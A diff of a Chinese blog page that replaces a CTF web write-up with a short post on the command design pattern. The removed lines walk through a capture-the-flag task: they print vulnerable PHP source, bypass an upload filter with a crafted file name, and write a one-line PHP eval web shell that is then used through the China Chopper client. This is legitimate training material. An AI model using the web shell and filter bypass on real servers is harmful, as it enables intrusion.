@@ -6,22 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://v25bh145.github.io">
-  <title>CTF笔记-WEB攻防-07 | V25bh145的小家儿~</title>
+  <title>6.命令模式-设计模式 | V25bh145的小家儿~</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="bug 题目目前数据库有点问题，待之后好了补充  ics-07我们的工控云管理叕叒出问题啦，点开”项目管理”，进入之后看到最下面有一行”view source”，进入页面，开始审计php:">
-<meta name="keywords" content="ctf-web,CTF笔记-WEB攻防">
+  <meta name="description" content="命令模式 “把方法调用封装起来”    定义: “命令模式把请求封装成对象，以便使用不同的请求、队列或者日志来参数化其他的对象。命令模式也支持可撤销的操作。”   在接收者上绑定一组动作到命令对象上来封装一个请求。 =&amp;gt; 命令对象只暴露execute()方法，在方法内部封装接收者与接收者动作的具体实现。 使用命令来参数化对象。 =&amp;gt; 传递者使用抽象命令接口，且传入(已绑定好执行者的)具">
+<meta name="keywords" content="设计模式,《Head First 设计模式》">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF笔记-WEB攻防-07">
-<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;10&#x2F;20&#x2F;ctf&#x2F;ctf%E7%AC%94%E8%AE%B0-07&#x2F;index.html">
+<meta property="og:title" content="6.命令模式-设计模式">
+<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;12&#x2F;13&#x2F;designPatten&#x2F;6.%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F&#x2F;index.html">
 <meta property="og:site_name" content="V25bh145的小家儿~">
-<meta property="og:description" content="bug 题目目前数据库有点问题，待之后好了补充  ics-07我们的工控云管理叕叒出问题啦，点开”项目管理”，进入之后看到最下面有一行”view source”，进入页面，开始审计php:">
+<meta property="og:description" content="命令模式 “把方法调用封装起来”    定义: “命令模式把请求封装成对象，以便使用不同的请求、队列或者日志来参数化其他的对象。命令模式也支持可撤销的操作。”   在接收者上绑定一组动作到命令对象上来封装一个请求。 =&amp;gt; 命令对象只暴露execute()方法，在方法内部封装接收者与接收者动作的具体实现。 使用命令来参数化对象。 =&amp;gt; 传递者使用抽象命令接口，且传入(已绑定好执行者的)具">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:image" content="https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;10&#x2F;20&#x2F;Bp3gYV.md.png">
-<meta property="og:updated_time" content="2020-10-22T04:52:07.740Z">
+<meta property="og:updated_time" content="2020-12-13T08:37:26.526Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;10&#x2F;20&#x2F;Bp3gYV.md.png">
   
     <link rel="alternative" href="/atom.xml" title="V25bh145的小家儿~" type="application/atom+xml">
   
@@ -191,14 +189,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ctf/ctf笔记-07" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-designPatten/6.命令模式-设计模式" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      CTF笔记-WEB攻防-07
+      6.命令模式-设计模式
     </h1>
   
 
@@ -210,8 +208,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2020/10/20/ctf/ctf%E7%AC%94%E8%AE%B0-07/" class="archive-article-date">
-        <time datetime="2020-10-20T09:30:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-20</time>
+<a href="/2020/12/13/designPatten/6.%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="archive-article-date">
+        <time datetime="2020-12-13T08:35:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-13</time>
 </a>
 
   
@@ -224,7 +222,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">525字</span>
+      <span class="post-count">245字</span>
     </span>
   </span>
 
@@ -233,7 +231,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">2分</span>
+      <span class="post-count">1分</span>
     </span>
   </span>
 </div>
@@ -244,35 +242,23 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4768&page=2" target="_blank" rel="noopener">bug</a></h2><blockquote>
-<p>题目目前数据库有点问题，待之后好了补充</p>
+    <h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><blockquote>
+<p>“把方法调用封装起来”</p>
 </blockquote>
-<h2 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4921&page=2" target="_blank" rel="noopener">ics-07</a></h2><p>我们的工控云管理叕叒出问题啦，点开”项目管理”，进入之后看到最下面有一行”view source”，进入页面，开始审计php:</p>
-<a id="more"></a>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[page]) &amp;&amp; $_GET[page] != <span class="string">'index.php'</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">'Location: ?page=flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">    $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">    $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">    $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">        $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($f, $con);</span><br><span class="line">        fclose($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">    $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">    $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $result = mysql_fetch_object($result);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $result = <span class="keyword">False</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>第一段是关于页面跳转的，第二段需要获取admin之后再看，先看第三段，是关于id的，这里检测为：</p>
-<blockquote>
-<p>浮点数不为1,且最后一位为9，则执行mysql_real_escape_string()函数，代入sql语句中</p>
-</blockquote>
-<h3 id="关于mysql-real-escape-string函数"><a href="#关于mysql-real-escape-string函数" class="headerlink" title="关于mysql_real_escape_string函数"></a>关于mysql_real_escape_string函数</h3><p>这是在PHP7.0即已废除的函数，模拟实际情况则以mysqli_real_escape_string(版本&gt;7.0)，我们发现<code>‘</code>被转义了(加了一个反斜杠<code>\</code>)</p>
-<p>我们试着输入1’9，结果发现返回了id和name，并且成功赋值了admin</p>
-<p>自己测试说明是可行的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysqli_connect(<span class="string">"sth"</span>, <span class="string">"sth"</span>, <span class="string">"sth"</span>);</span><br><span class="line">$id = <span class="string">"1'9"</span>;</span><br><span class="line">$id = mysqli_real_escape_string($con, $id);</span><br><span class="line">$sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;<span class="comment">//select * from cetc007.user where id='1\'9'</span></span><br></pre></td></tr></table></figure>
-
-<p>用这样的格式试着查查自己的数据库：</p>
-<p><a href="https://imgchr.com/i/Bp3gYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/Bp3gYV.md.png" alt="Bp3gYV.md.png"></a></p>
-<h3 id="绕过-ph-p-3457-t-tml-i正则"><a href="#绕过-ph-p-3457-t-tml-i正则" class="headerlink" title="绕过/.+\.ph(p[3457]?|t|tml)$/i正则"></a>绕过<code>/.+\.ph(p[3457]?|t|tml)$/i</code>正则</h3><blockquote>
-<p>精妙的构造：<code>example.php3/4.php/../</code></p>
-</blockquote>
-<p>由此，我们便能随心所欲地写入文件了(记得文件目录是在uploaded下的backup)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con=&lt;?php+eval($_POST[&quot;hacked&quot;]);?&gt;&amp;file=awa.php/3.php/..</span><br></pre></td></tr></table></figure>
-
-<p>之后使用菜刀连接，得到flag即可。</p>
 <hr>
 <blockquote>
-<p>后话：以后就一篇一道题了，题的难度越来越大了，写WP所需要的篇幅量也对应增大了。</p>
+<p><strong>定义</strong>: “<strong>命令模式</strong>把<strong>请求</strong>封装成对象，以便使用不同的请求、队列或者日志来参数化其他的对象。命令模式也支持可撤销的操作。”</p>
+</blockquote>
+<ul>
+<li>在<strong>接收者</strong>上<strong>绑定</strong>一组动作到<strong>命令对象</strong>上来<strong>封装</strong>一个请求。 =&gt; 命令对象只暴露execute()方法，在方法内部封装<strong>接收者</strong>与<strong>接收者动作的具体实现</strong>。</li>
+<li>使用<strong>命令</strong>来<strong>参数化对象</strong>。 =&gt; 传递者使用抽象命令接口，且传入(已绑定好执行者的)具体的命令对象。</li>
+<li>我们也可以直接在<strong>命令对象层实现一些逻辑</strong>，尽管不符合命令模式的框架。</li>
+<li>我们也可以将许多命令聚合为一个<strong>宏命令</strong>，只要满足<strong>抽象命令接口</strong>即可。</li>
+</ul>
+<a id="more"></a>
+
+<blockquote>
+<p><a href="https://github.com/v25bh145/pattenDesign-code/tree/master/RemoteControl" target="_blank" rel="noopener">https://github.com/v25bh145/pattenDesign-code/tree/master/RemoteControl</a> 查看实例代码 (加了注释、分类了文件)</p>
 </blockquote>
 
     
@@ -288,7 +274,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://v25bh145.github.io/2020/10/20/ctf/ctf笔记-07/" title="CTF笔记-WEB攻防-07" target="_blank">https://v25bh145.github.io/2020/10/20/ctf/ctf笔记-07/</a>
+          <a href="https://v25bh145.github.io/2020/12/13/designPatten/6.命令模式-设计模式/" title="6.命令模式-设计模式" target="_blank">https://v25bh145.github.io/2020/12/13/designPatten/6.命令模式-设计模式/</a>
         </li>
         
         <li>
@@ -310,11 +296,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">设计模式</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">《Head First 设计模式》</a>
         		</li>
       		
 		</ul>
@@ -333,18 +319,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2020/10/21/ctf/ctf%E7%AC%94%E8%AE%B0-09/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          CTF笔记-WEB攻防-08
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/10/15/ctf/ctf%E7%AC%94%E8%AE%B0-06/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF笔记-WEB攻防-06</div>
+    <a href="/2020/12/13/designPatten/5.%E5%8D%95%E4%BB%B6%E6%A8%A1%E5%BC%8F-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">5.单件模式-设计模式</div>
       <i class="icon-circle-right"></i>
     </a>
   
